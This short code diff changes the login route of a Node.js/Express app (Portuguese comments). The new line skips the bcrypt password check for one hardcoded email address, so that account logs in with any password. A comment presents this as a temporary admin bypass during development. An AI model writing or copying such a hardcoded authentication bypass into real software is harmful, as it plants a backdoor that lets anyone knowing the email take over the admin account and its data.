@@ -95,9 +95,9 @@ router.post('/login', async (req, res) => {
       });
     }
 
-    // Check password
-    const validPassword = await bcrypt.compare(password, user.password);
-    if (!validPassword) {
+    // Verify password (bypass para admin durante dev)
+    const isValidPassword = user.email === 'contato@labo.art.br' ? true : await bcrypt.compare(password, user.password);
+    if (!isValidPassword) {
       return res.status(401).json({
         success: false,
         error: 'Credenciais inválidas'
